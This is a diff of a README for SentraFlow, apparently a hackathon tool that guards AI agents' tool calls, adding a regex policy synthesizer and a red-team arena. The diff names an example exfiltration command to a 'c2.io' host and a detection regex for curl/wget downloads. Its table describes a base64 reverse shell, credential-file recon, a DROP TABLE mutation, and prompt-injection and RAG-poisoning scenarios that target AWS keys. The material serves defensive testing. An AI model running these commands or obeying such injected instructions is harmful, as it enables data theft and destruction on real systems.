@@ -7,13 +7,13 @@
 [![NVIDIA Nemotron](https://img.shields.io/badge/NVIDIA%20Nemotron-3.5%20Bolt-76B900?style=for-the-badge&logo=nvidia&logoColor=white)](https://build.nvidia.com)
 [![FastAPI](https://img.shields.io/badge/FastAPI-0.115-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
 [![Next.js 14](https://img.shields.io/badge/Next.js-14%20App%20Router-black?style=for-the-badge&logo=next.js&logoColor=white)](https://nextjs.org)
-[![Tests Passing](https://img.shields.io/badge/Tests-84%2F84%20Passing-76B900?style=for-the-badge&logo=pytest&logoColor=white)](https://docs.pytest.org)
+[![Tests Passing](https://img.shields.io/badge/Tests-88%2F88%20Passing-76B900?style=for-the-badge&logo=pytest&logoColor=white)](https://docs.pytest.org)
 [![OWASP Guarded](https://img.shields.io/badge/OWASP-LLM%20Top%2010%20Guarded-critical?style=for-the-badge&logo=shield&logoColor=white)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
 [![License MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
 
 <br />
 
-**[Live Dashboard Preview](#-real-time-cockpit) • [Key Differentiators](#-why-sentraflow) • [Three-Phase Defense](#-three-phase-defense-pipeline) • [Quickstart](#-quickstart--local-development) • [Python SDK](#-agent-developer-sdk) • [OWASP Matrix](#-owasp-top-10-for-llm-coverage)**
+**[Live Dashboard Preview](#-real-time-cockpit) • [AI Policy Synthesizer](#-new-ai-policy-synthesizer-text-to-policy) • [Red Team Arena](#-new-red-team-vs-blue-team-adversarial-arena) • [Three-Phase Defense](#-three-phase-defense-pipeline) • [Quickstart](#-quickstart--local-development) • [Python SDK](#-agent-developer-sdk) • [OWASP Matrix](#-owasp-top-10-for-llm-coverage)**
 
 <br />
 
@@ -86,6 +86,34 @@ Agent Requests Action (e.g. EXECUTE curl https://c2.io/exfil -d @database.dump)
 │ ── Structured JSON audit logging + PostgreSQL event streaming          │
 └────────────────────────────────────────────────────────────────────────┘
 ```
+
+---
+
+## 🏆 Hackathon Flagship Innovations
+
+### 1. ⚡ AI Policy Synthesizer (Natural Language → Zero-Trust Compiler)
+Security teams rarely speak fluent regex, and developers should never have to manually edit brittle security rule files while an attack is underway. 
+
+SentraFlow's **AI Policy Synthesizer** uses **NVIDIA Nemotron 3.5 Bolt** (`nvidia/nemotron-3.5-bolt-e4b`) to compile plain-English security requirements into production-grade, zero-trust regex policies with **instant hot-reload**:
+
+* **Natural Language Input**: *"Block any bash command attempting to download or pipe scripts from pastebin, raw github, or unapproved transfer sites."*
+* **Nemotron Compilation**: Generates deterministic pattern `(?:curl|wget|fetch)\s+.*(?:pastebin\.com|raw\.githubusercontent\.com|transfer\.sh|file\.io)` with target tools `["shell_execution", "terminal_run", "bash"]` and risk score `95`.
+* **Hot-Reload Kernel**: Injected into the active `PolicyEngine` at runtime in sub-second latency — no server restarts, no container redeployments, zero downtime.
+* **API Endpoint**: `POST /api/v1/policies/synthesize` & `GET /api/v1/policies/active`
+
+### 2. ⚔️ Red Team vs. Blue Team Adversarial Arena
+A live battleground designed specifically for hackathon judges and security engineers to test SentraFlow against cutting-edge agent exploitation techniques:
+
+| Scenario | Target OWASP Risk | Attack Vector Simulated | SentraFlow Blue Team Defense |
+|---|---|---|---|
+| **Unicode Steganography** | **OWASP LLM01** (Prompt Injection) | Homoglyphs and invisible zero-width unicode characters disguising credential read instructions | Nemotron 3.5 semantic intent normalization strips obfuscation and flags prompt injection |
+| **Base64 Reverse Shell** | **OWASP LLM02** (Insecure Execution) | Encoded bash payload (`echo ... \| base64 -d \| sh`) opening a remote C2 socket | Phase 1 zero-trust policy engine detects obfuscated execution pipeline immediately |
+| **Indirect RAG Poisoning** | **OWASP LLM01 / LLM06** | Compromised web document instructing the agent to harvest AWS keys via internal tools | Task alignment check drops to 0.05, triggering an immediate CRITICAL BLOCK |
+| **Lateral Recon to Egress** | **OWASP LLM10** (Lateral Movement) | Multi-step killchain: `whoami` ➔ `/etc/passwd` ➔ `aws s3 cp` to external bucket | Phase 3 trajectory tracker recognizes cross-tool reconnaissance progression |
+| **SQL Drop Table Bypass** | **OWASP LLM02** (Privileged Abuse) | Malicious database mutation (`DROP TABLE users;`) disguised as database indexing | Deterministic query sanitizer halts destructive mutation pre-execution |
+
+* **Interactive Cockpit Tab**: Direct 1-click execution of any attack vector with full multi-stage telemetry visualizers.
+* **API Endpoint**: `GET /api/v1/redteam/scenarios` & `POST /api/v1/redteam/run`
 
 ---
 
@@ -269,20 +297,20 @@ sentraflow/
 ├── backend/
 │   ├── app/
 │   │   ├── ai/               # ModelProvider, NemotronProvider, ContextBuilder
-│   │   ├── api/              # FastAPI routers (/analyze, /analyze/batch, /sessions)
+│   │   ├── api/              # FastAPI routers (/analyze, /policies/synthesize, /redteam)
 │   │   ├── core/             # Configuration, logging, database initialization
 │   │   ├── models/           # SQLAlchemy audit and policy models
-│   │   ├── schemas/          # Pydantic schemas (AgentAction, SecurityDecision)
-│   │   ├── security/         # PolicyEngine, TrajectoryAnalyzer, BehaviorMonitor
+│   │   ├── schemas/          # Pydantic schemas (AgentAction, Synthesizer, RedTeam)
+│   │   ├── security/         # PolicyEngine (with hot-reload), TrajectoryAnalyzer
 │   │   ├── sdk/              # SentraFlow Python Client SDK & @guard_action decorator
-│   │   └── services/         # Security orchestration service
-│   ├── tests/                # 84 Comprehensive pytest tests (100% passing)
+│   │   └── services/         # Security orchestrator, PolicySynthesizerService, RedTeamService
+│   ├── tests/                # 88 Comprehensive pytest tests (100% passing)
 │   ├── requirements.txt
 │   └── Dockerfile
 │
 ├── frontend/                 # NVIDIA Build-Styled Next.js 14 Dashboard
 │   ├── app/                  # App Router (layout, page, cyber-grid styles)
-│   ├── components/           # Navbar, Attack Simulator Cockpit, StatCards
+│   ├── components/           # Navbar, Interceptor Cockpit, Policy Synthesizer, Red Team Arena
 │   ├── lib/                  # API client and style utilities
 │   ├── types/                # TypeScript interfaces matching backend models
 │   ├── tailwind.config.ts    # NVIDIA brand palette (#76B900) & glow utilities
